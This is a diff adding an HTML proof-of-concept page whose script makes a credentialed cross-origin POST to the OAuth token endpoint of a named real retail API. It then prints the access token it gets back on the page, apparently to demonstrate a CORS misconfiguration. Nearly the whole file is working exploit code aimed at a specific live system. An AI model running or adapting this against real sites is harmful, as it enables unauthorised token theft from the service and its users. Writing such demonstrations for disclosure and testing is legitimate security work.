@@ -1,0 +1,41 @@
+<h2>PoC </h2>
+<div id="result"></div>
+<script>
+    function submitRequest() {
+      return new Promise(function(resolve, reject) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.watsons.vn/authorizationserver/oauth/token?base_site=wtcvn&client_id=frontend&client_secret=public&grant_type=client_credentials", true);
+        xhr.setRequestHeader("content-type", "application/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+          if (xhr.status >= 200 && xhr.status < 300) {
+            resolve(xhr.response);
+          } else {
+            reject(xhr.statusText);
+          }
+        };
+  
+        xhr.onerror = function() {
+          reject(xhr.statusText);
+        };
+  
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      });
+    }
+  
+    submitRequest()
+      .then(function(response) {
+        console.log("Response:", response);
+        document.querySelector('#result').textContent = 'Your access token: '+response
+        // Handle the response here
+      })
+      .catch(function(error) {
+        console.error("Error:", error);
+        // Handle errors here
+      });
+  </script>
+  
